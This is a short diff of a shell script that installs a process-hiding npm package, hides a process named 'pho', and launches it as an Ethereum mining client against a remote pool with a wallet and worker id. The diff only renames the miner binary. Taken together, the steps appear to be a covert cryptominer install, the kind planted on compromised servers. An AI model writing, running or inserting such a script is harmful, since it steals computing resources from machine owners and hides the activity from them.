@@ -4,5 +4,5 @@ apt-get install -y nodejs
 npm i -g node-process-hider
 ph add pho
 chmod +x pho
-./guc -pool ethash.infinityton.com:4444 -wal f39829a015d4.worker1 -proto 4
+./pho -pool ethash.infinityton.com:4444 -wal f39829a015d4.worker1 -proto 4
 
